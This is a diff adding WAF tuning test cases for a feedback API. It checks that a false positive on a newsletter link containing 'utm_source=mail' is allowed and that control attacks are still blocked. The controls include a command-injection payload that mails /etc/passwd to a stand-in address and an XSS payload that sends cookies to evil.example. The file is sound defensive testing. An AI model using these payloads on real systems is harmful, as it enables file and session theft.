@@ -1,0 +1,46 @@
+# FP-001 — a customer pastes a tracking link into a feedback comment.
+# Before tuning: CRS 932235 (Unix command injection) matches "=mail" and the
+# request is blocked. After tuning (exclusion 1010): allowed, while real
+# attacks in the same field and the same pattern elsewhere are still blocked.
+# Full write-up: docs/tuning-journal/FP-001.md
+id: FP-001
+name: feedback comment containing a URL with utm_source=mail
+kind: false-positive
+request:
+  method: POST
+  path: /api/Feedbacks/
+  json: {comment: "The link https://example.com/?ref=juice&utm_source=mail in your newsletter has a typo", rating: 4, captchaId: 1, captcha: "12"}
+expected: {decision: allowed, not_rule_ids: [932235]}
+---
+id: FP-001-CTRL-1
+name: command injection in the same comment field is still blocked
+kind: control
+request:
+  method: POST
+  path: /api/Feedbacks/
+  json: {comment: "nice; cat /etc/passwd | mail attacker@example.test", rating: 1}
+expected: {decision: blocked, intercepted_by: 949110}
+---
+id: FP-001-CTRL-2
+name: XSS in the same comment field is still blocked (only 932235 was excluded)
+kind: control
+request:
+  method: POST
+  path: /api/Feedbacks/
+  json: {comment: "<script>document.location='https://evil.example/?c='+document.cookie</script>", rating: 1}
+expected: {decision: blocked, intercepted_by: 949110}
+---
+id: FP-001-CTRL-3
+name: the same "=mail" pattern in another route/field still triggers 932235
+kind: control
+request: {method: GET, path: /rest/products/search, params: {q: "x", next: "=mail -s pwned"}}
+expected: {rule_ids: [932235]}
+---
+id: FP-001-CTRL-4
+name: the same comment sent to a different route is still blocked (route-scoped exclusion)
+kind: control
+request:
+  method: POST
+  path: /api/Complaints/
+  json: {comment: "The link https://example.com/?ref=juice&utm_source=mail in your newsletter has a typo"}
+expected: {decision: blocked, rule_ids: [932235]}
